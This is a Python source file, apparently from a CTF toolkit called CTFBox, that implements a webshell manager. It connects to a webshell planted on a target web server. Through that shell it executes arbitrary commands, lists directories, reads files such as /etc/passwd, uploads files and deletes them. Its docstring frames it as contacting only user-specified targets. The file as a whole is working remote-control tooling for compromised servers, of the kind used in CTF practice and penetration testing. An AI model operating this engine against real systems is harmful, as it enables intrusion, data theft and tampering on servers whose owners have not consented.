#!/usr/bin/env python3
"""CTFBox 第一方 Webshell 管理引擎。

通过 stdin/stdout 的 NDJSON 协议驱动（每行一个 JSON 对象）：

请求（op）:
  {"op":"connect","target":"http://h/s.php","password":"pass","payloadType":"php","encoder":"base64"}
  {"op":"exec","cmd":"id"}
  {"op":"ls","path":"/var/www"}
  {"op":"read","path":"/etc/passwd"}
  {"op":"upload","path":"/tmp/a","content":"<base64>"}
  {"op":"delete","path":"/tmp/a"}
  {"op":"disconnect"}

事件（ev）:
  {"ev":"connected","info":{...}}
  {"ev":"exec","cmd":..,"output":..}
  {"ev":"listing","path":..,"entries":[{"name","type","size"}]}
  {"ev":"file","path":..,"encoding":"base64","content":..}
  {"ev":"progress","stage":..,"path":..,"done":true}
  {"ev":"error","message":..,"op":..}

设计约定：引擎向目标注入一段语言相关的 loader 代码（password 参数），
真实的动作参数以 JSON 放在 ARG_PARAM 参数里（raw 或 base64 传输）；
shell 侧解码后执行，并将 `{"ok":bool,...}` 结果包裹在 MARKER 之间回显。
引擎解析 MARKER 内的 JSON。仅连接用户显式指定的目标，不落盘、不扫描。
"""

from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request

from protocols import Operation, get_protocol
from protocols.ctfbox import ARG_PARAM, MARKER_END, MARKER_START  # 兼容旧测试端点

TIMEOUT = 15
DEFAULT_PROTOCOL = "ctfbox"

__all__ = ["ARG_PARAM", "MARKER_START", "MARKER_END", "Session", "main"]


# ---------------------------------------------------------------------------
# 会话：持有当前协议编解码器，负责一次 HTTP 往返。
# ---------------------------------------------------------------------------

class Session:
    def __init__(self) -> None:
        self.protocol = None  # type: ignore[assignment]

    @property
    def connected(self) -> bool:
        return self.protocol is not None

    def open(self, **kwargs) -> None:
        """按名字构造协议编解码器；kwargs 透传（protocol/target/password/...）。"""
        name = kwargs.pop("protocol", DEFAULT_PROTOCOL) or DEFAULT_PROTOCOL
        self.protocol = get_protocol(name, **kwargs)

    def close(self) -> None:
        self.protocol = None

    def request(self, operation: str, params: dict) -> dict:
        """向目标发送一次操作请求，返回协议解码后的规范结果。"""
        if self.protocol is None:
            raise RuntimeError("尚未连接")
        body, headers = self.protocol.build_request(operation, params)
        req = urllib.request.Request(
            self.protocol.target,
            data=body,
            method="POST",
            headers=headers,
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:  # noqa: S310 用户指定目标
            raw = resp.read()
        return self.protocol.parse_response(operation, raw)


# ---------------------------------------------------------------------------
# NDJSON 事件输出
# ---------------------------------------------------------------------------

def emit(event: dict) -> None:
    sys.stdout.write(json.dumps(event, ensure_ascii=False))
    sys.stdout.write("\n")
    sys.stdout.flush()


# ---------------------------------------------------------------------------
# 操作分发
# ---------------------------------------------------------------------------

def op_connect(session: Session, message: dict) -> None:
    target = message.get("target")
    if not isinstance(target, str) or not target:
        raise ValueError("缺少目标地址")
    session.open(
        protocol=message.get("protocol", DEFAULT_PROTOCOL),
        target=target,
        password=str(message.get("password", "pass")),
        payload_type=message.get("payloadType", "php"),
        encoder=message.get("encoder"),
    )
    try:
        info = session.request(Operation.SYSINFO, {})
    except Exception:
        session.close()
        raise
    emit({"ev": "connected", "info": info})


def op_exec(session: Session, message: dict) -> None:
    cmd = message.get("cmd")
    if not isinstance(cmd, str) or not cmd:
        raise ValueError("缺少命令")
    data = session.request(Operation.EXEC, {"cmd": cmd})
    emit({"ev": "exec", "cmd": cmd, "output": data.get("output", "")})


def op_ls(session: Session, message: dict) -> None:
    path = str(message.get("path", "."))
    data = session.request(Operation.LIST, {"path": path})
    emit({"ev": "listing", "path": path, "entries": data.get("entries", [])})


def op_read(session: Session, message: dict) -> None:
    path = message.get("path")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少文件路径")
    data = session.request(Operation.READ, {"path": path})
    emit(
        {
            "ev": "file",
            "path": path,
            "encoding": "base64",
            "content": data.get("content", ""),
        }
    )


def op_upload(session: Session, message: dict) -> None:
    path = message.get("path")
    content = message.get("content")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少目标路径")
    if not isinstance(content, str):
        raise ValueError("缺少文件内容")
    data = session.request(Operation.WRITE, {"path": path, "content": content})
    emit(
        {
            "ev": "progress",
            "stage": "upload",
            "path": path,
            "written": data.get("written", 0),
            "done": True,
        }
    )


def op_delete(session: Session, message: dict) -> None:
    path = message.get("path")
    if not isinstance(path, str) or not path:
        raise ValueError("缺少目标路径")
    session.request(Operation.DELETE, {"path": path})
    emit({"ev": "progress", "stage": "delete", "path": path, "done": True})


OPERATIONS = {
    "connect": op_connect,
    "exec": op_exec,
    "ls": op_ls,
    "read": op_read,
    "upload": op_upload,
    "delete": op_delete,
}


def dispatch(session: Session, message: dict) -> bool:
    """执行一条操作，返回 False 表示应结束循环。"""
    op = message.get("op")
    if op == "disconnect":
        session.close()
        emit({"ev": "progress", "stage": "disconnect", "done": True})
        return False
    handler = OPERATIONS.get(op)
    if handler is None:
        emit({"ev": "error", "op": op, "message": f"未知操作：{op}"})
        return True
    if op != "connect" and not session.connected:
        emit({"ev": "error", "op": op, "message": "尚未连接目标"})
        return True
    try:
        handler(session, message)
    except (urllib.error.URLError, OSError) as error:
        emit({"ev": "error", "op": op, "message": f"网络错误：{error}"})
    except Exception as error:  # noqa: BLE001 引擎需保持不崩溃
        emit({"ev": "error", "op": op, "message": str(error)})
    return True


def main() -> int:
    session = Session()
    for raw_line in sys.stdin:
        line = raw_line.strip()
        if not line:
            continue
        try:
            message = json.loads(line)
        except json.JSONDecodeError as error:
            emit({"ev": "error", "op": None, "message": f"无效 JSON：{error}"})
            continue
        if not isinstance(message, dict):
            emit({"ev": "error", "op": None, "message": "请求必须是 JSON 对象"})
            continue
        if not dispatch(session, message):
            break
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
